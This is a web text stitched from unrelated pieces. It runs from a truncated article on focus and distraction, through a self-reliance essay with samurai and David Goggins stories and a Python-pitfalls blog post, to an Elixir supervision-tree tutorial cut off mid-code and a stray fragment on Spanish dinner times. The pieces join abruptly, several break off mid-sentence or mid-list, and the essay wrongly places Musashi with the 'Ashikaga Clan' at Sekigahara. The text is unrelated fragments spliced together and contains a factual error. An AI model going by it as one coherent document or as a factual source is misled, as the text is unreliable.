       <p>According to researchers from the University of California-San Diego, we consume through our phones, laptops, TVs and all other devices about&nbsp;<a target="_blank" href="https://ijoc.org/index.php/ijoc/article/viewFile/1566/743">34 GB of information per day.</a></p>
       <p>The researchers say this leads to an information overload that hampers our focus and leads to constant interruptions that prevent us from reflection and deeper thinking.</p>
       
       
       <h4><strong>Reason #2: filtering out information takes effort.</strong></h4>
       <p>Contrary to common sense,&nbsp;<strong>ignoring things is not a passive mental process.</strong></p>
       <p>Researchers have found that&nbsp;<strong>it takes energy to ignore irrelevant stimuli.</strong></p>
       <p>In the Distracted Mind, neuroscientist Adam Gazzaley writes:</p>
       <blockquote><p>What we learned from this experiment was that the act of ignoring is not a passive process; rather, the goal to ignore something is an active one that is mediated by the top-down suppression of activity below baseline levels of passively viewing.</p>
       <p><a target="_blank" href="https://www.ncbi.nlm.nih.gov/pubmed/15814009">(Source)</a></p>
       </blockquote>
       <p>It's not just about focusing better, but also about&nbsp;<em>ignoring better.</em></p>
       
       
       <h4><strong>Reason #3: we're being trained like mice by a variable-ratio reward schedule.</strong></h4>
       <p>Every like on social media, every notification, every email represents something&nbsp;<em>new!!!</em></p>
       <p><em>New</em>&nbsp;is exciting for us. Every such message releases the&nbsp;<a target="_blank" href="http://sitn.hms.harvard.edu/flash/2018/dopamine-smartphones-battle-time/">neurotransmitter dopamine</a>&nbsp;in our heads, making us feel good and adventurous.</p>
       <p><em>What if my crush sent me a message?</em><br>
       <em>What if I got that job?</em><br>
       <em>What if a friend wants to meet up and hang?</em></p>
       <p>Unlike in the past, now we carry with us devices that enable us to check if the above is true in about 3 seconds.</p>
       <p>How are we then supposed to do work which may require serious mental effort when we have dopamine-candy within our reach almost 24/7?</p>
       
       <p><strong>We process more information than ever, so filtering out the noise takes a lot of effort, and we're constantly being led astray from focus by dopamine-loaded interruptions. No wonder we can't focus.</strong></p>
       
       <h2>How to improve focus</h2>
       <p>Given that ignoring is an active process, we'll suggest ways to both ignore noise better and focus on the signal better.</p>
       <h3>Strategic focus vs task focus</h3>
       <p>Before we go any further, we'll split focus into 2 types:</p>
       <ul>
       <li><strong>1. Strategic focus</strong><br>
       Answering the question: What to focus on?</li>
       <li><strong>2. Task focus</strong><br>
       Answering the question: How do I focus on work?</li>

       </ul>
       
       <h3>1. How to improve strategic focus</h3>
       <p>Let's start with the obvious.</p>
       
       <h4>Define what you want to focus on</h4>
       <p>It's hard to focus on something if you don't know what it is.</p>
       <p>If you're looking into a heavy fog, there's nothing to focus on. Same goes for mental fog.</p>
       <p>While it's becoming popular to say "systems &gt; goals" or even "no goals" at all, we are goal-driven by nature.</p>
       <p>On a neural level, we filter information through our goals. Our perception of reality is to a large extent driven by goals.</p>
       <p>As neuroscientist Adam Gazzaley writes in the Distracted Mind:</p>
       <blockquote><p>... the inward flow of information is sculpted and pruned by goals in much the same way that our actions are, resulting in our perceptions being an interpretation of reality and not a veridical representation.</p>
       </blockquote>
       <p>In other words, when you're looking for Waldo, your mind activates neural circuits to find someone in a red-striped shirt and ignores almost all else.</p>
       <p>Your goal determines your perception of reality. You're more likely to spot information relevant to your goal than all other information out there.</p>
       <p>If you have a clear goal, it will be that much easier to spot the right information to help you achieve it and ignore the noise.</p>
       <p>Which brings us to this question:<br>
       <strong>What do you want to do?</strong></p>
       <p>Make a list.</p>
       <p>Once you have some sort of a list, it's not yet time to pursue all the items on it.</p>
       <p>It's time to prioritize and refine.</p>
       
       <h4>Define what&nbsp;<em>not</em>&nbsp;to focus on - use Warren Buffett's goal setting method</h4>
       <p>Once you have any kind of a list of things you'd like to accomplish, it's not yet time to pursue goals. That would be unfocused.</p>
       <p>Here's Warren Buffett's advice on goals:</p>
       <ol>
       <li>Write down the top 25 goals that you want to achieve in life.</li>
       <li>Select the 5 that matter the most.</li>
       <li>Forget the rest.</li>

       </ol>
       <p>Buffett highlights that pursuing all 25 will distract you. It will lead to a haphazard, unfocused approach that likely won't lead to results.</p>
       <p>The general principle of picking fewer goals than you think you want can be applied every day. It's a safeguard against the tendency to pick too many goals and diffuse your efforts.</p>
       
       <h4>Find 2 Wildly Important Goals<br>(and put them where you'll see them)</h4>
       <p>In 4 Disciplines of Execution, the authors recommend finding 2 wildly important goals (WIGs).</p>
       <p>WIGs are goals that are so important that if you achieve them, everything else will likely work out.</p>
       <p>They also recommend putting your goals into a specific format:<br>
       <strong>X to Y by when.</strong></p>
       <p>If you were to define the 2 Wildly Important Goals to focus on, what would they be?</p>
       <ul>
       <li>Get to $10 000 in revenue by July 1.</li>
       <li>Write 50 000 words by August 31st.</li>
       <li>...</li>

       </ul>
       <p><strong>Define your goals to have a clear target to focus on.</strong></p>
       <p>However, that's not enough. You can write down the goals and forget them. Completely.</p>
       <p>You need to be hyper-aware of those goals, so that they stay on your mind even through the daily turmoil of life.</p>
       <p>How to do that?</p>
       <p>How to focus on goals that matter despite the noise? </p>
       
       <h4>Create an ambient visual reminder for WIGs</h4>
       <p>Once you have clear goals, you need to make them obvious to you every day.</p>
       <p>To do that, we recommend creating an ambient visual reminder.</p>
       <p>A post-it note written with a thick marker on your desk.<br>
       A big poster above your door.<br>
       A timeline on a whiteboard.</p>
       <p>Something in your&nbsp;<em>physical</em>&nbsp;(not digital) environment.</p>
       <p>The trouble with a digital environment is that if you have a goal written in a to-do app of some sort, once you close it it's out of sight out of mind. If you don't open the app in the morning, you don't get reminded of the goal.</p>
       <p><strong>Create a highly visual reminder for your goals and place it in your surroundings so that you see it every day. Every time you glance at it, it will remind you to focus.</strong></p>
       
       <h4>Strategic focus - summary</h4>
       <ol>
       <li><strong>Define what to focus on.</strong><br>
       Make a written list.</li>
       <li><strong>Select only the top-most items from that list - ideally 2 items.</strong><br>
       Decide to explicitly&nbsp;<em>not</em>&nbsp;focus on other, less important goals at the moment.</li>
       <li><strong>Phrase them in the following way: From X to Y by when.</strong></li>
       <li><strong>Place a visual reminder in your surroundings.</strong><br>
       Put it somewhere in your physical environment where it's impossible to miss.</li>

       </ol>
       <p>If you do this, you will become hyper-aware of when you're moving towards your most important goals, and when you're not. What you need to focus on will stay at the top of your mind, instead of being forgotten.</p>
       
       
       <h3>2. How to improve task focus</h3>
       <p>Once you know what to focus on, it's time to focus on it.</p>
       <p>As we mentioned before, ignoring irrelevant stimuli is not a passive process. It takes effort.</p>
       <p>It makes sense to divide improving concentration into 2 parts:</p>
       <ul>
       <li>Improve ignoring</li>
       <li>Improve concentration</li>

       </ul>
       <p>Let's get into it.</p>
       
       <h4>How to ignore better</h4>
       <p>To minimize the effort required to ignore irrelevant stimuli, either remove them if you can, or use something to make it easier to block out the noise.</p>
       <ul>
       <li><p><strong>Put on noise-canceling headphones.</strong><br>
       This is taking the&nbsp;<em>ignore the noise</em>&nbsp;literally. Background noises can disrupt our attention (especially true for people with ADD/ADHD). Whether it is your neighbors arguing or a&nbsp;<em>PING!</em>&nbsp;of a notification, if you can't hear them, you don't need to take the effort to filter them out.</p>
       </li>
       <li><p><strong>Find a quiet place to work.</strong><br>
       Sometimes even noise-canceling headphones aren't enough, in that case a public library or an empty class/conference room might do wonders. Even a different room can work.</p>
       </li>
       <li><p><strong>Declutter.</strong><br>
       Headphones will help with auditory clutter, but what about visual clutter?<br>
       If you have 50 post-its with ideas and to-do lists in sight, it'll take more effort to not glance at them. Remove them.<br>
       Same goes for 25 open browser tabs. Close them or go into fullscreen mode.</p>
       </li>
       <li><p><strong>Batch distracting activities.</strong><br>
       If you need to respond to emails or work requests as they come, learn to ignore them, if for but a moment.<br>
       Deal with emails once every 30 minutes, or once an hour, instead of checking it randomly whenever you get a tiny bit bored or stressed.<br>
       Minimize the number of switches between tasks.</p>
       </li>
       <li><p><strong>Minimize distractions before a work session.</strong></p>
       <p>The phone is a distraction machine. Sure, we can use it productively, but when it's sitting on our desks during work, it's a constant reminder that we could be doing something&nbsp;<em>fun</em>&nbsp;instead.<br>
       Here are our suggestions on minimizing digital distractions:</p>

        <p>Picture this: An injured Japanese Samurai warrior finds himself in search of a place of rest in a quiet bamboo forest. He quietly steps over any fallen branches, fearing that the noise would attract unwanted visitors. Despite his careful footing, he trips and catches his fall on a large bamboo trunk and thus makes a noise loud enough that it weaves and traverses through the woods. As the echo leaves, a new noise returns. Sounds of pacing footsteps and heavy armour start to make their way toward him.</p>
<p>Enemies have become aware of the lonely warrior’s presence.</p>
<p>The samurai now has a detrimental problem on his hands. He must act fast, utilising <em>any</em> available means. What he cannot do, is lament the possibilities of what he could have carried with him. During the battle that leads to this very moment, the warrior had injured himself badly and even lost his only sword to a lethal opposition. Thinking about how he could have defended himself with the sword which he no longer possessed, would be pointless. He would become stuck in a kind of paralysis that would only bring him a sense of loss and a lack of confidence in his next decision.</p>
<p>Luckily, the warrior instead ignores this ephemeral thought and gets to work: grabbing a fallen branch to tie any loose possessions he was carrying onto his back, the warrior began to climb one of the wider trunks. Despite struggling, at this point, the noise was not a concern for the samurai as he knew the approaching soldiers were making more in their charge, meaning that they would likely not notice his climb.</p>
<p>Now, much higher up and out of sight, the warrior slings his bag around the tree and uses it as a means to tie himself to the wood – providing himself with more time up that very tree. He let the impatient, opposing samurai that were searching the forest in hopes of slashing the heads off any remaining fighters – to pass by. The warrior was now safe.</p>
<p>The wisdom learnt from a story like this would echo for years as writers such as <a href="http://daretolivewithoutlimits.com/about-us/" rel="noopener noreferrer" target="_blank">Bryan Golden</a> would point out that, ‘wishing for something one doesn’t have wastes time while accomplishing nothing’. To understand why this kind of thinking is paramount to avoid, you must first educate yourself on the importance of your ability to <em>work with what you have</em>.</p>
<p>Our world thrives in moments when the individuals who occupy it are useful.</p>
<p>Defined mainly by creations that provide higher meaning and value to humanity; usefulness seems like an obvious goal for you to have in mind. Instead, subtle yet devastating distractions may snatch ambition and desire away from you; leaving you dependent on things which present very little in meaning or fulfilment.</p>
<p>Your dependency, however, is not to things which are in your immediate grasp. It is instead to the theoretical, a realm of ideas in which you exercise your thinking but refuse give power to move you into useful action. This dependency also brings with it dangers which may leave you powerless: unable to control the path in which you will travel on, through life.</p>
<p>Those who are most formidable in life, who have built great businesses, art and legacies of usefulness, are those who have utterly mastered the art of <em>self-reliance</em>. This art is one that you must aim to deeply immerse yourself in.</p>
<p>Self-reliance brings with it the power to do great things. Self-reliance provides true confidence, leadership and a lack of compromising dependencies. Whilst there are many means to amplify this self-reliance, one to immediately develop is to learn to <strong><em>work with what you have</em></strong>.</p>
<p>American athlete, Arthur Ashe famously stated that you should ‘start where you are. Use what you have. Do what you can.’ And whilst this may seem at first read, to be blindly optimistic – it is in fact, extremely practical advice. There are plentiful examples of those who have used what is within their means, utilising time, creativity and an intense acceptance for reality, in order to create and achieve. They let go of any dependencies they had and understood that, as Bryan Golden elegantly wrote: ‘opportunities are missed due to inaction… inaction results from waiting for ideal conditions’.</p>

<p>Throughout life, you must look to these opportunities and must do so by cleverly using what tools you have in your grasp; rather than leaving your hands open, expecting your equipment to change. Think of the following stories as examples of the necessary steps to move you toward this way of creativity and self-reliance.</p>
<h2>Use time wisely</h2>
<p><a href="https://www.youtube.com/watch?v=78I9dTB9vqM" rel="noopener noreferrer" target="_blank">David Goggins</a> is considered to be one of the most elite endurance athletes in the world. In his many achievements, a stand out feat for Goggins would be his triumphant completion of the Badwater Ultra Marathon. This particular marathon demands a gruelling 135 miles from each runner. Not only does it require this unimaginable distance, but it drags those who brave the run through the sweltering and soul-torturing desert of Death Valley, California.</p>
<p>Goggins crossed the finish line of Badwater Ultra Marathon at the time of 25:49:40.</p>
<p>Due to his prolific notoriety, many of those who follow Goggins’ efforts already know this staggering statistic and achievement. Despite this, many do not know that David Goggins actually set out to start running Ultramarathons at a point in his life when he had never run before. Ignoring the more standard choice of slowly progressing up in distances, Goggins threw himself into the deep end. Upon choosing between whether to sink or swim; Goggins designed, what would later become, his daily running routine.</p>
<p>His routine was (and still is) as follows:</p>
<p>Each morning Goggins arises at 3 am, allowing for a bursting start with a run of between 10-15 miles. Riding this energetic start, he hops onto his bicycle for a 25-mile commute to work. It’s lunchtime. Goggins finds time for another run. Here, he sneaks in 5-8 miles. Following a hard day’s work; Goggins finds himself locked in a commitment, previously made on his commute <em>to</em> work, as he is demanded to cycle another 25 miles back home.</p>
<p>But David Goggins doesn’t stop there. He refuses for tiredness to seep into his routine and proceeds to allow his will to drive him back out and onto a final 3-5 mile run.</p>
<p>When thinking about fitting in work to pursue a passion or work on a side-project, those who have full-time jobs may utter such phrases such as ‘if only I had more time’ or ‘I am always so busy’, but Goggins, whilst running his countless miles every day – also maintained a full-time career. When working with what you have, you must make sure to use the most precious resource you have, wisely. Seneca wrote in his prolific text, <em><a href="https://amzn.to/2IcioVj" rel="noopener noreferrer" target="_blank">On the Shortness of Life</a></em>, how ‘it is not that we have so little time but that we lose so much’.</p>
<p>Another example you should look to, to understand how time can be mastered, comes from the legendary story of the wandering samurai warrior: Miyamoto Musashi. Known mainly for his intense dedication to the craft of swordsmanship, Musashi’s status places him among the <a href="https://justincampbellplatt.com/blog/deadly-samurai">greatest warriors</a> who have ever lived. Besides his mastery of the sword, the lone fighter was a devoted student of strategy and in his later life, wrote his book on the art of strategy: <a href="https://amzn.to/2IhpZxR" rel="noopener noreferrer" target="_blank"><em>The Book of Five Rings</em></a>. Amongst the many strategies that Musashi would take advantage of, one stands out to those who wish to utilise time effectively.</p>
<figure><img alt="" src="https://justincampbellplatt.com/media/pages/blog/work-with-what-you-have/1f1459e750-1601212153/musashi.jpg"></figure>
<p>For most <em>Shugyou-Sho</em> (lone-wondering fighters), ‘<em>borrowing the battlefield’</em> meant flocking to any major battle in an attempt to be noticed by either a Shogun or Daimyo in hopes to be granted the respected status of a Samurai.</p>
<p>But what Musashi saw in this strategy, was a deeper, more powerful underlying opportunity. One that may not have paid him the economic rewards or stature in the short-term, but instead would have provided him with incredibly intense and real practice for the art of swordsmanship.</p>
<p>The Battle of Sekigahara was a conflict that saw the last military dictatorship of Japan being established. The battle took place two years following the death of Toyotomi Hideyoshi, who had previously succeeded in unifying Japan without having to become Shogun. This left the country under rule of his five-year-old son. Musashi fought on the side of the Ashikaga Clan against the oncoming army of Ieyasu Tokugawa. However, he and the army he had tied himself to, lost and many of the army were even massacred following the fight. Musashi, luckily, managed to survive.</p>
<p>Now of course, it cannot be denied that this was presenting the 17-year-old, unemployed warrior with the opportunity to be noticed by those higher up the rank; but this was not Musashi’s sole intention. His main motivation was having the opportunity to practice the craft of swordsmanship in an environment where the stakes were of life and death and the enemies were in plentiful supply. And whilst the potential benefits of being noticed did appeal to the fighter; it did not distract young Musashi, and in fact, acted more so as an increase in the already high-demanding benchmark for success.</p>
<p>Miyamoto Musashi <em>lived</em> his art – and his immense dedication should not be taken lightly. ‘There is nothing outside of yourself that can ever enable you to get better, stronger, richer, quicker, or smarter. Everything is within. Seek nothing outside of yourself.’ These words prove that Musashi clearly mastered the art and realisation of self-reliance. This desire to excel in his craft came from within. If Musashi were <em>borrowing the battlefield</em> with only the desire to be granted the title of Samurai, Musashi may not have excelled in the same way.</p>

<p>If the answer is yes, then keep reading. Chances are that if you program in Python, you will probably fall into one of these silly behaviors.</p>
<p>In the part 1 of this series I’m going to show you 5 things that have a great potential drive you mad in Python. Some of them are very subtle and others are not obvious at all. By learning about them in advanced, you can save hours of debugging time. So brace yourself and let’s go!</p>

<p>I confess that this one has costed me several hours of my life. When used correctly it is very nice but when you don’t, it’s a headache.</p>
<p>In Python you can concatenate strings using not only using the <code>+</code> operator but also implicitly. The following snippet illustrates a very common bug in Python.</p>
<pre><code>In [<span>2</span>]: <span>"french "</span> + <span>"bulldog"</span>
Out[<span>2</span>]: <span>'french bulldog'</span>
</code></pre>
<p>That's fine, <code>&lt;string&gt; + &lt;string&gt;</code> generates a new <code>&lt;string&gt;</code>. But what you may not know is that you can leave <code>+</code> out and Python will still concatenate the string.</p>
<pre><code>In [<span>3</span>]: <span>"french "</span> <span>"bulldog"</span>
Out[<span>3</span>]: <span>'french bulldog'</span>
</code></pre>
<p>When is this a problem, then? It'll be an issue when you want a list of strings and forget a comma.</p>
<pre><code>In [<span>4</span>]: dogs = [<span>"poodle"</span> <span>"french bulldog"</span>, <span>"pit bull"</span>, <span>"american bully"</span>]
In [<span>6</span>]: dogs
Out[<span>6</span>]: [<span>'poodlefrench bulldog'</span>, <span>'pit bull'</span>, <span>'american bully'</span>]
</code></pre>
<p>Oh, it can get worse. Imagine you have a function that accepts two strings, but the second one is optional.</p>
<pre><code>In [<span>11</span>]: <span><span>def</span> <span>print_pair</span>(<span>a: str, b: Optional[str] = None</span>):</span>
    ...:     print(<span>"a: "</span>, a, <span>"b: "</span>, b)
In [<span>13</span>]: print_pair(
    ...: <span>"First string"</span>
    ...: <span>"Second string"</span>
    ...: )
a:  First stringSecond string b:  <span>None</span>
</code></pre>
<p>You see? The function runs just fine, so that’s not great! Situations like these can hide nasty bugs. The lesson here is clear: be careful when passing strings to functions or using them as list of items.</p>
<h2 id="walrus-wat">Walrus WAT!?</h2>
<p><img src="https://media.giphy.com/media/cv4aHA3NS4YxO/giphy.gif" alt="A dog playing goes #fail"></p>
<p>In 2019, Python 3.8 introduced the walrus operator. This new feature generated a lot of controversies. Some people loved whereas other actually hated it. The goal of this post is not to debate that, so I’ll dive right into what makes walrus confusing.</p>
<p>Before Python 3.8, you could not assign a value to a variable and test if it was “truthy” in the same statement.  For example, see the following example, of reading data from a socket until an empty string is read. This examples is inspired by  <a target="_blank" href="https://www.python.org/dev/peps/pep-0572/#capturing-condition-values">one</a>  described in the PEP.</p>
<p>Without <code>walrus</code>:</p>
<pre><code>data = sock.recv(<span>4096</span>)
<span>while</span> data:
    clean_data = clean(data)
    print(<span>"Received data:"</span>, data)
    data = sock.recv(<span>4096</span>)
</code></pre>
<p>With <code>walrus</code>:</p>
<pre><code><span>while</span> data := sock.recv(<span>4096</span>):
    clean_data = clean(data)
    print(<span>"Received data:"</span>, data)
</code></pre>
<p>That is, you do both the assignment and the checking in the same line by using <code>:=</code>.</p>
<p>In Python we can use tuples to assign values to more than one variable in the same line.</p>
<pre><code>In [<span>1</span>]: a, b = <span>2</span>, <span>3</span>

In [<span>2</span>]: a
Out[<span>2</span>]: <span>2</span>

In [<span>3</span>]: b
Out[<span>3</span>]: <span>3</span>
</code></pre>
<blockquote>
<p>Hum... we probably can do the same using walrus, right?</p>
</blockquote>
<pre><code>In [<span>4</span>]: (a, b := <span>16</span>, <span>19</span>)
Out[<span>4</span>]: (<span>2</span>, <span>16</span>, <span>19</span>)
</code></pre>
<blockquote>
<p>WAT!</p>

<p>Thanks to  <a target="_blank" href="https://www.reddit.com/user/ForceBru/">@ForceBru</a> who kindly  <a target="_blank" href="https://www.reddit.com/r/Python/comments/jh66bh/how_to_shoot_yourself_in_the_foot_with_python/g9wfoi9/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">corrected me</a>, what gets assigned to <code>b</code> is not a tuple, but only the first element after <code>:=</code>.
As a result, <code>(a, b := 16, 19)</code> is the same as <code>(a, (b := 16), 19)</code>. And that explains why a 3-tuple is returned.</p>
<p>You can verify that by <a target="_blank" href="https://tio.run/##K6gsycjPM7YoKPr/PzO3IL@oRCGxuISLq6AoM69EA8jUSynNLQAzChKLilM1lDQSdRSSrGwVDM10FAwtNZU0NTX//wcA">printing the AST</a> .</p>

<h2 id="be-careful-when-using-with-lists">Be Careful When Using <code>+=</code> With Lists</h2>
<p><img src="https://media.giphy.com/media/GEObzG7vNeRUs/giphy.gif" alt="A dog falling down the stairs"></p>
<p>Lists in Python are incredibly nice. You can perform all sorts of stuff like:</p>
<ul>
<li>concatenating multiple lists using <code>+</code> operator</li>
<li>generating a repeated list by using the <code>*</code> operator</li>
<li>concatenate and assign lists using <code>+=</code></li>
</ul>
<p>Let’s look at an example on how <code>+</code> operator works with the <code>list</code> object. I know you may be tired of such toy examples, but please, bear with me.</p>
<pre><code>In [<span>20</span>]: lst = [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]

In [<span>21</span>]: lst_copy = lst

In [<span>22</span>]: lst = lst + [<span>8</span>, <span>9</span>]

In [<span>23</span>]: lst

</code></pre>
<p>Cool, we created a list called <code>lst</code> then we built a new one named <code>lst_copy</code> by pointing it to <code>lst</code>. Then we changed <code>lst</code> by appending <code>[8, 9]</code> to it. As expected, the <code>+</code> operator expanded <code>lst</code> whereas <code>lst_copy</code> remained the same.</p>
<p>In Python one can shorten expressions like <code>a = a + 1</code> as <code>a += 1</code>. As I mentioned in the beginning, you can also use the <code>+=</code> operator with lists. So, let’s give it a shot and re-write our example.</p>
<pre><code>In [<span>25</span>]: lst = [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>]

In [<span>26</span>]: lst_copy = lst

In [<span>27</span>]: lst += [<span>8</span>, <span>9</span>]

In [<span>28</span>]: lst
Out[<span>28</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]

In [<span>29</span>]: lst_copy
Out[<span>29</span>]: [<span>3</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>7</span>, <span>8</span>, <span>9</span>]
</code></pre>
<blockquote>
<p>WAAATTT!? What happened here?</p>
</blockquote>
<p>The reason for this behavior is that, like other Python operators, the implementation of <code>+=</code> is defined by the class that implements it. That is, to define <code>+=</code> the <code>list</code> class has defined a <code>object.__iadd__(self, other)</code> magic method. And the way it works is the same as <code>list.extends</code>. </p>
<p>So why has <code>lst_copy</code> been modified? </p>
<p>Because it is not an actual copy of <code>lst</code> but it points to the in memory.</p>

<p>The key takeaway is, don't blindly assume operators will have the same semantics across different classes. </p>
<h2 id="mutable-defaults">Mutable Defaults</h2>
<p><img src="https://media.giphy.com/media/13cbZDgXa23UeQ/giphy.gif" alt="A dog jumping sofas #fail"></p>
<p>I understand that this one might not be new to you. However, it’s unquestionably one of the most dangerous. The case I’m talking about is the usage of mutable default arguments on functions. If you don’t know what this is all about, take a look at the following example.</p>
<pre><code>In [<span>35</span>]: <span><span>def</span> <span>add_fruit</span>(<span>fruit: str, basket: list = []</span>) -&gt; list:</span>
    ...:     basket.append(fruit)
    ...:     <span>return</span> basket
    ...: 

In [<span>36</span>]: b = add_fruit(<span>"banana"</span>)

In [<span>37</span>]: b
Out[<span>37</span>]: [<span>'banana'</span>]

In [<span>38</span>]: c = add_fruit(<span>"apple"</span>)

In [<span>39</span>]: c
Out[<span>39</span>]: [<span>'banana'</span>, <span>'apple'</span>]
</code></pre>
<blockquote>
<p>WAAATT!?</p>
</blockquote>
<p>As you can see, we call the function twice without passing a list to it. The ultimate result is a list with two items, how did that happen?</p>
<p>The reason for this behavior is that when the interpreter defines the function, it also creates the default argument. Then, it binds the object created to the function argument. </p>
<p>In our problem, Python allocated an empty list and bound it to the argument <code>basket</code>. To make things simpler to follow, let’s look at a visual example made with <a target="_blank" href="http://www.pythontutor.com/">python tutor</a>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603048050068/v39uSktN5.png?auto=format&amp;q=60" alt="mutable-1.png"></p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603048076920/D_qYippaU.png?auto=format&amp;q=60" alt="mutable-2.png"></p>
<p>As you can see, the argument <code>basket</code> is created once and the function points to it during its entire lifetime. The only exception is when you pass another list to it but that won’t change the default. Whenever you call the function again without passing a list to it, it will use the one created when the function was defined.</p>
<blockquote>
<p>How can we avoid this, then?</p>
</blockquote>
<p>To avoid this, you must set the argument to <code>None</code> and create a list if none is passed.</p>
<pre><code>In [<span>44</span>]: <span><span>def</span> <span>add_fruit</span>(<span>fruit: str, basket: Optional[list] = None</span>):</span>
    ...:     <span>if</span> basket <span>is</span> <span>None</span>:
    ...:         basket = []
    ...:     basket.append(fruit)
    ...:     <span>return</span> basket

In [<span>45</span>]: b = add_fruit(<span>"banana"</span>)

In [<span>46</span>]: b
Out[<span>46</span>]: [<span>'banana'</span>]

In [<span>47</span>]: c = add_fruit(<span>"apple"</span>)

In [<span>48</span>]: c
Out[<span>48</span>]: [<span>'apple'</span>]
</code></pre>
<p>Great! Now we create a list whenever no argument is passed to the function, which fixes the bug.</p>
<h2 id="chained-operations-gone-wrong">Chained Operations Gone Wrong</h2>
<p><img src="https://media.giphy.com/media/3oEduU8I0dHP38CdLW/giphy.gif" alt="A dog playing on grass and failing"></p>
<p>Chained operations are an exceptional feature. It makes the code terse without sacrificing readability. I discuss it in more detail in another blog <a target="_blank" href="https://miguendes.me/5-hidden-python-features-you-probably-never-heard-of">post</a> but to provide you a bit of context let’s see it in action.</p>
<pre><code><span>&gt;&gt;&gt; </span>x = <span>10</span>
<span>&gt;&gt;&gt; </span><span>20</span> == x == <span>0</span>
<span>False</span>
<span>&gt;&gt;&gt; </span><span>25</span> &gt; x &lt;= <span>15</span>
<span>True</span>
</code></pre>
<p>Let's pay close attention to the first example. If Python didn't have this feature, that statement could be re-written as:</p>
<pre><code>In [<span>53</span>]: <span>20</span> == x <span>and</span> x == <span>0</span>
Out[<span>53</span>]: <span>False</span>
</code></pre>
<p>Now, what happens if we add parentheses to enforce some kind of precedence?</p>
<pre><code>In [<span>51</span>]: <span>20</span> == x == <span>0</span>
Out[<span>51</span>]: <span>False</span>

In [<span>52</span>]: (<span>20</span> == x) == <span>0</span>
Out[<span>52</span>]: <span>True</span>
</code></pre>
<blockquote>
<p>Wait? What on earth has just happened?</p>
</blockquote>
<p>When we added the parentheses, <code>(20 == x)</code> was evaluated to <code>False</code>. However, the problem is that <code>False</code> is then compared to <code>0</code>.  ̶S̶i̶n̶c̶e̶ ̶<code>̶0̶</code>̶ ̶i̶s̶ ̶c̶o̶n̶s̶i̶d̶e̶r̶e̶d̶ ̶a̶ ̶"̶F̶a̶l̶s̶y̶"̶ ̶v̶a̶l̶u̶e̶,̶ ̶t̶h̶e̶n̶ ̶t̶h̶e̶ ̶c̶o̶m̶p̶a̶r̶i̶s̶o̶n̶ ̶r̶e̶t̶u̶r̶n̶s̶ ̶'̶T̶r̶u̶e̶`̶.̶</p>
<p>As pointed out by <a href="https://hashnode.com/@alexmojaki" target="_blank" rel="noopener noreferrer">@alexmojaki</a>, <code>False == 0</code> is <code>True</code> because <code>bool</code> is a subclass of <code>int</code>. For instance, other "Falsy" values such as <code>[]</code> or <code>""</code> are not equal to <code>False</code>.</p>

One of the most important features of high-quality service is its reliability. In other words, the service should rarely, if ever, be unavailable.</p><p data-v-d417aca0="">In the Elixir world, we can achieve this easily using a concept known as a supervision tree. Supervision tree is a structure of processes that allows us to build reliable, fault-tolerant and self-healing systems. This can make our application resistant to unexpected bugs that can creep up in the production. The kind of bugs that are really difficult to reproduce and that require specific state of the application to appear (google the term heisenbug). Supervision tree helps us in dealing with those kinds of bugs by simply restarting the part of the tree that's causing the problems. That way, we get to start off with a clean slate, and most of the times, that's enough to solve our issues.</p><p data-v-d417aca0="">So, how does Elixir make that possible?</p><p data-v-d417aca0="">First, let's take a look at how a supervision tree looks graphically.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-complex.png" alt="complex tree" data-v-d417aca0=""></p><p data-v-d417aca0="">At its core, the supervision tree consists of two types of processes: workers and supervisors (imaginatively marked W and S, respectively).</p><p data-v-d417aca0="">Workers are simply processes which run some kind of logic. They are the meat of your application. Supervisors, on the other hand, are processes which supervise other processes, be it workers or other supervisors. This sounds like some kind of processeption, but at its base, it's not that complicated.</p><p data-v-d417aca0="">There are two main tasks a supervisor has: restarting its children processes in the desired way when they terminate (expectedly or unexpectedly), and terminating itself along with its children processes if it deems necessary, i.e. when there's something off with the state in its part of the application.</p><p data-v-d417aca0="">In simpler terms, workers run the domain code and if some error occurs and the worker crashes, or it finishes its work and “dies”, its supervisor restarts it. If crashing happens too often, the supervisor terminates the said process, along with the rest of its children and then terminates itself.</p><p data-v-d417aca0="">There are three available restart strategies:<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_one</code> - the supervisor restarts just the process that terminated,<br data-v-d417aca0="">- <code data-v-d417aca0="">:one_for_all</code> - the supervisor restarts all of its children if any of its children processes terminates,<br data-v-d417aca0="">- <code data-v-d417aca0="">:rest_for_one</code> - the supervisor restarts the terminated process and the processes defined after the crashed one (I'll refer to this later, to make it more clear with an example).</p><p data-v-d417aca0="">If the restart strategy isn't enough to fix our application, self-termination kicks in. When we define a supervisor process, we can also define its restart tolerance, i.e. how many restarts of its children it will tolerate in certain amount of time before it decides to terminate itself and its children processes (default tolerance is total of 3 restarts in 5 seconds). That way we propagate process restart one level up, making the parent supervisor process restart our supervisor process, which, in turn, starts all of its children processes once again, and we're starting off with a clean slate.</p><p data-v-d417aca0="">Now, enough theory, let's put all this into practice!</p><h2 id="“simple-supervision-tree”" data-v-d417aca0="">Simple supervision tree</h2><p data-v-d417aca0="">Let's start off by making an extremely simple supervision tree, which will be made of one supervisor process and two of its children, which will be workers.</p><p data-v-d417aca0=""><img src="https://kodius.com/images/blog/elixir-supervision-tree-simple.png" alt="simple-tree" data-v-d417aca0=""></p><p data-v-d417aca0="">First, we'll define our supervisor process.</p><pre data-v-d417aca0=""><code data-v-d417aca0=""><span data-v-d417aca0=""><span data-v-d417aca0="">defmodule</span> <span data-v-d417aca0="">SimpleSupervisor</span></span> <span data-v-d417aca0="">do</span>

    <p>A few years ago I went to Spain for the first time, and like many I was surprised by <strong>how late is dinner</strong>. The first night I dined almost alone in a restaurant at 8pm, going away just as people were starting to come in. Of course this can be mostly explained by cultural reasons, but the clearly later-than-usual summer sunsets must also have played a role in shaping the Spanish days.</p>

    Solar time vs standard time

</figure>

